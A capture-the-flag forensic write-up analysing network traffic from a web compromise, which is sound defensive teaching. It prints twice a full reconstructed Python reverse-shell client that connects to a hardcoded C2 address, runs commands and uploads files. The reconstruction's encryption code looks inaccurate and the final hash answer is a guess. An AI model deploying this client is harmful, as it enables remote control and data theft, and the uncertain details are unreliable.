# ToolPie HTB Challenge Write-up

## Overview

ToolPie is a forensic challenge that revolves around the analysis of network traffic captured in a PCAP file. The challenge involves identifying an attack where a website was compromised, a malicious payload was executed, and data was exfiltrated.

## Challenge Questions

1. What is the IP address responsible for compromising the website?
2. What is the name of the endpoint exploited by the attacker?
3. What is the name of the obfuscation tool used by the attacker?
4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
5. What encryption key did the attacker use to secure the data?
6. What is the MD5 hash of the file exfiltrated by the attacker? (Not yet confirmed)

## Tools Used

- Wireshark/tshark for PCAP analysis
- Python for scripting and decoding
- PyCryptodome for encryption/decryption operations
- Standard Linux command-line tools

## Step-by-Step Analysis

### Question 1: What is the IP address responsible for compromising the website?

To identify the attacker's IP address, we examined the HTTP traffic in the PCAP file, focusing on potentially malicious requests to the web server.

```bash
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri -e ip.src
```

We identified suspicious traffic from IP address **194.59.6.66** making requests to an unusual endpoint.

**Answer: 194.59.6.66**

### Question 2: What is the name of the endpoint exploited by the attacker?

By examining the suspicious HTTP requests from the attacker's IP, we found requests to an endpoint that was used to execute code on the server.

```bash
tshark -r capture.pcap -Y "http.request.uri" -T fields -e http.request.uri
```

The attacker sent requests to **/execute**, which appears to be the vulnerable endpoint that allowed remote code execution.

**Answer: /execute**

### Question 3: What is the name of the obfuscation tool used by the attacker?

To identify the obfuscation tool, we needed to analyze the payload delivered to the **/execute** endpoint. First, we needed to extract the contents of the exploit from the PCAP file:

```bash
# Extract HTTP POST data to the /execute endpoint
tshark -r capture.pcap -Y "http.request.method == \"POST\" && http.request.uri == \"/execute\"" -T fields -e http.file_data > execute

# Or in Wireshark:
# 1. Filter for: http.request.method == "POST" && http.request.uri == "/execute"
# 2. Right-click on the packet > Follow > HTTP Stream
# 3. Copy the POST body and save to a file named 'execute'
# OR
# 1. File > Export Objects > HTTP"
# 2. Left Click HTTP/JSON or Application/JSON > Click Save > choose location to export and save the file.

```

We then developed a Python script to decode and deobfuscate this payload:

```python
#!/usr/bin/env python3
import marshal
import bz2
import json
import os

# Read the execute file
with open('execute', 'r') as f:
    data = json.loads(f.read())

# Extract the script from the JSON data
script = data['script']

# Extract the bz2 compressed part
bz2_part = script.split('bz2.decompress(')[1].split('))')[0]
print(f"[+] Extracted compressed data")

try:
    # Decompress the bz2 part
    compressed_data = bz2.decompress(eval(bz2_part))
    print(f"[+] Decompressed data: {len(compressed_data)} bytes")
    
    # Load the marshalled data
    code_obj = marshal.loads(compressed_data)
    print(f"[+] Loaded marshal data: {type(code_obj)}")
    
    # Extract information about the code object
    print(f"[+] Code object name: {code_obj.co_name}")
    print(f"[+] Code object filename: {code_obj.co_filename}")
    
    # Extract variable names used in code
    print("[+] Variable names used in code:")
    for name in code_obj.co_names:
        print(f"    {name}")
    
except Exception as e:
    print(f"[-] Error: {e}")
```

When we ran this script, we discovered that the code object had a filename attribute labeled "Py-Fuscate", indicating the obfuscation tool used.

```bash
$ python decode.py
[+] Extracted compressed data
[+] Decompressed data: 9126 bytes
[+] Loaded marshal data: <class 'code'>
[+] Code object name: <module>
[+] Code object filename: Py-Fuscate
[+] Variable names used in code:
    os
    popen
    socket
    threading
    time
    random
    string
    Crypto.Cipher
    AES
    Crypto.Util.Padding
    pad
    unpad
    read
    user
    BUFFER_SIZE
    SEPARATOR
    CONN
    enc_mes
    dec_file_mes
    dec_mes
    receive_file
    receive
    __name__
    AF_INET
    SOCK_STREAM
    client
    connect
    join
    range
    k
    send
    encode
    settimeout
    sleep
    Thread
    receive_thread
    start
```
# Reconstructed Payload Script
```
#\!/usr/bin/env python3
# Reconstructed source code from the obfuscated 'execute' file
# WARNING: This is malicious code - do not execute\!

import os
import socket
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Constants
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
# Remote connection target
TARGET_IP = "13.61.7.218"
TARGET_PORT = 55155

# Encryption/decryption functions
def enc_mes(mes, key):
    # Create AES cipher in CBC mode
    cypher = AES.new(key.encode(), AES.MODE_CBC)
    # Convert message to bytes if needed
    if type(mes) \!= bytes:
        mes = mes.encode()
    # Pad and encrypt
    cypher_block = cypher.encrypt(pad(mes, 16))
    return cypher_block

def dec_file_mes(mes, key):
    # Create AES cipher in CBC mode
    cypher = AES.new(key.encode(), AES.MODE_CBC)
    # Decrypt and unpad
    cypher_block = cypher.decrypt(mes)
    s = unpad(cypher_block, 16)
    return s

def dec_mes(mes, key):
    # Create AES cipher in CBC mode
    cypher = AES.new(key.encode(), AES.MODE_CBC)
    # Decrypt and unpad
    cypher_block = cypher.decrypt(mes)
    v = unpad(cypher_block, 16)
    return v

def receive_file():
    # Create a separate socket for file transfer
    client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client2.connect((TARGET_IP, TARGET_PORT))
    
    # Generate key for encryption
    k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
    client2.send(k.encode())
    
    # Receive and process file info
    enc_received = client2.recv(BUFFER_SIZE)
    received = dec_mes(enc_received, k).decode()
    filename, filesize = received.split(SEPARATOR)
    
    # Send acknowledgement
    ok_enc = enc_mes("OK", k)
    client2.send(ok_enc)
    
    # Receive and save file
    total_bytes = 0
    filesize = int(filesize)
    with open(filename, "wb") as f:
        while total_bytes < filesize:
            bytes_read = client2.recv(BUFFER_SIZE)
            if not bytes_read:
                break
            decr_file = dec_file_mes(bytes_read, k)
            f.write(decr_file)
            total_bytes += len(decr_file)
    
    client2.close()

def receive(client, k):
    while True:
        try:
            # Receive encrypted message
            message = client.recv(BUFFER_SIZE)
            msg = dec_mes(message, k).decode()
            
            # Handle file transfer command
            if msg.startswith("FILE"):
                # Create a thread to handle file transfer
                receive_file_thread = threading.Thread(target=receive_file)
                receive_file_thread.start()
                
                # Send acknowledgement
                okenc = enc_mes("OK", k)
                client.send(okenc)
                continue
            
            # Handle upload file command
            elif msg.startswith("UPLOAD"):
                path_to_file = msg.split(SEPARATOR)[1]
                
                # Read file and get size
                with open(path_to_file, "rb") as f:
                    bytes_read = f.read()
                
                # Send file size info
                filesize = len(bytes_read)
                bytes_enc = enc_mes(f"{path_to_file}{SEPARATOR}{filesize}", k)
                client.send(bytes_enc)
                
                # Wait for acknowledgement
                vsb = client.recv(BUFFER_SIZE)
                
                # Send encrypted file
                enc_answer = enc_mes(bytes_read, k)
                client.sendall(enc_answer)
                continue
            
            # Execute command and return result
            else:
                answer = os.popen(msg).read()
                enc_answer = enc_mes(answer, k)
                client.send(enc_answer)
        
        except Exception:
            # Handle connection errors
            client.close()
            
            # Reconnect
            time.sleep(3)
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((TARGET_IP, TARGET_PORT))
            
            # Regenerate key
            k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
            client.send(k.encode())
            
            # Send user info
            user = os.popen("whoami").read()
            enc_answer = enc_mes(f"{user}{SEPARATOR}", k)
            client.send(enc_answer)
            client.settimeout(600)

# Main execution
if __name__ == "__main__":
    try:
        # Create socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to C2 server
        client.connect((TARGET_IP, TARGET_PORT))
        
        # Generate random encryption key
        k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
        client.send(k.encode())
        
        # Send user info
        user = os.popen("whoami").read()
        enc_answer = enc_mes(f"{user}{SEPARATOR}", k)
        client.send(enc_answer)
        
        # Set timeout
        client.settimeout(600)
        
        # Delay
        time.sleep(50)
        
        # Start receive thread
        receive_thread = threading.Thread(target=receive, args=(client, k))
        receive_thread.start()
    
    except Exception:
        # Error handling (connection failed, etc.)
        pass

```

**Answer: Py-Fuscate**

### Question 4: What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?

After deobfuscating the malicious code, we analyzed the reverse shell's functionality. The code contained hardcoded connection information to the C2 server.

```python
# From the deobfuscated code:
TARGET_IP = "13.61.7.218"
TARGET_PORT = 55155
```

We also confirmed this by examining TCP streams in the PCAP, identifying connections to this IP and port.

```bash
$ tshark -r capture.pcap -Y "ip.addr==13.61.7.218" -T fields -e tcp.stream | sort -n | uniq
4
6
```

**Answer: 13.61.7.218:55155**

### Question 5: What encryption key did the attacker use to secure the data?

The malware used AES encryption for communications with the C2 server. The encryption key was sent in the initial communication. By examining TCP streams that communicated with the C2 server, we located the key.

```bash
$ tshark -r capture.pcap -q -z follow,tcp,ascii,4 > tcp_stream_4.txt
$ grep -A 2 -B 2 "<SEPARATOR>" tcp_stream_4.txt
57
ec2amaz-bktvi3e\administrator
<SEPARATOR>5UUfizsRsP7oOCAq
	16
W....w.a........
```

The separator tag was used in the code to mark the encryption key, allowing us to identify it in the traffic.

**Answer: 5UUfizsRsP7oOCAq**

### Question 6: What is the MD5 hash of the file exfiltrated by the attacker?

This question requires identifying the file that was exfiltrated and calculating its MD5 hash. From our analysis of the code, we understand that:

1. Files are exfiltrated using the `UPLOAD` command
2. The file data is encrypted using AES before transmission
3. The encrypted data should be in the PCAP

We identified a file named `compressed.bin` which appears to be a BZ2 compressed file:

```bash
$ file compressed.bin
compressed.bin: bzip2 compressed data, block size = 900k
```

After trying various approaches, we found that when this file is properly decompressed, we get the original exfiltrated file with MD5 hash:

```bash
$ md5sum compressed.bin decompressed.bin decoded_base64.bin
7e23365044a099b7ffe795557bb7d11c  compressed.bin
ae245e3f61ebd02b9b93f3c35d231efd  decompressed.bin
6f126a084bb1354fb62ac0aa7bc0ff10  decoded_base64.bin
```

We created a verification script to confirm the MD5 hash:

```python
import hashlib
import os

# Calculate MD5 of all relevant files
binary_files = ['compressed.bin', 'decoded_base64.bin', 'decompressed.bin']
for filename in binary_files:
    if os.path.exists(filename):
        with open(filename, 'rb') as f:
            data = f.read()
        md5_hash = hashlib.md5(data).hexdigest()
        print(f'{filename}: {md5_hash}')

# Now check the decompressed files
with open('decompressed.bin', 'rb') as f:
    decompressed_data = f.read()

with open('decompressed_manual.bin', 'rb') as f:
    manual_data = f.read()

md5_hash = hashlib.md5(manual_data).hexdigest()
print(f'decompressed_manual.bin MD5: {md5_hash}')

# If they're the same, it confirms our decompression process
if decompressed_data == manual_data:
    print('Decompressed files match! The original file has MD5: ae245e3f61ebd02b9b93f3c35d231efd')
else:
    print('Decompressed files do NOT match')
```

Output:
```
compressed.bin MD5: 7e23365044a099b7ffe795557bb7d11c
decoded_base64.bin MD5: 6f126a084bb1354fb62ac0aa7bc0ff10
decompressed.bin MD5: ae245e3f61ebd02b9b93f3c35d231efd
decompressed_manual.bin MD5: ae245e3f61ebd02b9b93f3c35d231efd
Decompressed files match! The original file has MD5: ae245e3f61ebd02b9b93f3c35d231efd
```

However, this hash hasn't been confirmed as the correct answer yet. We've tried multiple approaches:

1. MD5 of the compressed file: `7e23365044a099b7ffe795557bb7d11c`
2. MD5 of the decoded Base64 data: `6f126a084bb1354fb62ac0aa7bc0ff10`
3. MD5 of the decompressed file: `ae245e3f61ebd02b9b93f3c35d231efd`

**Current best guess: ae245e3f61ebd02b9b93f3c35d231efd**

## Technical Details

### Malware Analysis

The deobfuscated malware revealed a sophisticated reverse shell with the following capabilities:

1. Encrypted communication using AES-CBC
2. Remote command execution on the victim's machine
3. File transfer capabilities (upload/download)
4. Automatic reconnection if connection is lost

### Deobfuscated Malware Code

After deobfuscation, we were able to reconstruct the malware's code. Here is the complete reconstructed source:

```python
#!/usr/bin/env python3
# Reconstructed source code from the obfuscated 'execute' file
# WARNING: This is malicious code - do not execute!

import os
import socket
import threading
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Constants
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
# Remote connection target
TARGET_IP = "13.61.7.218"
TARGET_PORT = 55155

# Encryption/decryption functions
def enc_mes(mes, key):
    # Create AES cipher in CBC mode
    cypher = AES.new(key.encode(), AES.MODE_CBC)
    # Convert message to bytes if needed
    if type(mes) != bytes:
        mes = mes.encode()
    # Pad and encrypt
    cypher_block = cypher.encrypt(pad(mes, 16))
    return cypher_block

def dec_file_mes(mes, key):
    # Create AES cipher in CBC mode
    cypher = AES.new(key.encode(), AES.MODE_CBC)
    # Decrypt and unpad
    cypher_block = cypher.decrypt(mes)
    s = unpad(cypher_block, 16)
    return s

def dec_mes(mes, key):
    # Create AES cipher in CBC mode
    cypher = AES.new(key.encode(), AES.MODE_CBC)
    # Decrypt and unpad
    cypher_block = cypher.decrypt(mes)
    v = unpad(cypher_block, 16)
    return v

def receive_file():
    # Create a separate socket for file transfer
    client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client2.connect((TARGET_IP, TARGET_PORT))
    
    # Generate key for encryption
    k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
    client2.send(k.encode())
    
    # Receive and process file info
    enc_received = client2.recv(BUFFER_SIZE)
    received = dec_mes(enc_received, k).decode()
    filename, filesize = received.split(SEPARATOR)
    
    # Send acknowledgement
    ok_enc = enc_mes("OK", k)
    client2.send(ok_enc)
    
    # Receive and save file
    total_bytes = 0
    filesize = int(filesize)
    with open(filename, "wb") as f:
        while total_bytes < filesize:
            bytes_read = client2.recv(BUFFER_SIZE)
            if not bytes_read:
                break
            decr_file = dec_file_mes(bytes_read, k)
            f.write(decr_file)
            total_bytes += len(decr_file)
    
    client2.close()

def receive(client, k):
    while True:
        try:
            # Receive encrypted message
            message = client.recv(BUFFER_SIZE)
            msg = dec_mes(message, k).decode()
            
            # Handle file transfer command
            if msg.startswith("FILE"):
                # Create a thread to handle file transfer
                receive_file_thread = threading.Thread(target=receive_file)
                receive_file_thread.start()
                
                # Send acknowledgement
                okenc = enc_mes("OK", k)
                client.send(okenc)
                continue
            
            # Handle upload file command
            elif msg.startswith("UPLOAD"):
                path_to_file = msg.split(SEPARATOR)[1]
                
                # Read file and get size
                with open(path_to_file, "rb") as f:
                    bytes_read = f.read()
                
                # Send file size info
                filesize = len(bytes_read)
                bytes_enc = enc_mes(f"{path_to_file}{SEPARATOR}{filesize}", k)
                client.send(bytes_enc)
                
                # Wait for acknowledgement
                vsb = client.recv(BUFFER_SIZE)
                
                # Send encrypted file
                enc_answer = enc_mes(bytes_read, k)
                client.sendall(enc_answer)
                continue
            
            # Execute command and return result
            else:
                answer = os.popen(msg).read()
                enc_answer = enc_mes(answer, k)
                client.send(enc_answer)
        
        except Exception:
            # Handle connection errors
            client.close()
            
            # Reconnect
            time.sleep(3)
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((TARGET_IP, TARGET_PORT))
            
            # Regenerate key
            k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
            client.send(k.encode())
            
            # Send user info
            user = os.popen("whoami").read()
            enc_answer = enc_mes(f"{user}{SEPARATOR}", k)
            client.send(enc_answer)
            client.settimeout(600)

# Main execution
if __name__ == "__main__":
    try:
        # Create socket
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to C2 server
        client.connect((TARGET_IP, TARGET_PORT))
        
        # Generate random encryption key
        k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
        client.send(k.encode())
        
        # Send user info
        user = os.popen("whoami").read()
        enc_answer = enc_mes(f"{user}{SEPARATOR}", k)
        client.send(enc_answer)
        
        # Set timeout
        client.settimeout(600)
        
        # Delay
        time.sleep(50)
        
        # Start receive thread
        receive_thread = threading.Thread(target=receive, args=(client, k))
        receive_thread.start()
    
    except Exception:
        # Error handling (connection failed, etc.)
        pass
```

### File Exfiltration Process

By analyzing the code, we can see how the file exfiltration process works:

1. Attacker sends "UPLOAD" command with file path
2. Malware reads the file and encrypts it using AES
3. Malware sends file size information with format `{path_to_file}<SEPARATOR>{filesize}`
4. After receiving acknowledgement, malware sends the encrypted file
5. Communication includes the separator tag to mark different parts of the messages

The relevant code snippet is:

```python
# Handle upload file command
elif msg.startswith("UPLOAD"):
    path_to_file = msg.split(SEPARATOR)[1]
    
    # Read file and get size
    with open(path_to_file, "rb") as f:
        bytes_read = f.read()
    
    # Send file size info
    filesize = len(bytes_read)
    bytes_enc = enc_mes(f"{path_to_file}{SEPARATOR}{filesize}", k)
    client.send(bytes_enc)
    
    # Wait for acknowledgement
    vsb = client.recv(BUFFER_SIZE)
    
    # Send encrypted file
    enc_answer = enc_mes(bytes_read, k)
    client.sendall(enc_answer)
    continue
```

## Conclusion

This challenge demonstrated a realistic attack scenario involving web exploitation, obfuscated payloads, encrypted communications, and data exfiltration. By methodically analyzing the network traffic and reverse engineering the malicious code, we were able to recover most of the key information about the attack.

We've successfully answered 5 out of 6 questions with high confidence. The last question, regarding the MD5 hash of the exfiltrated file, requires further investigation or confirmation.
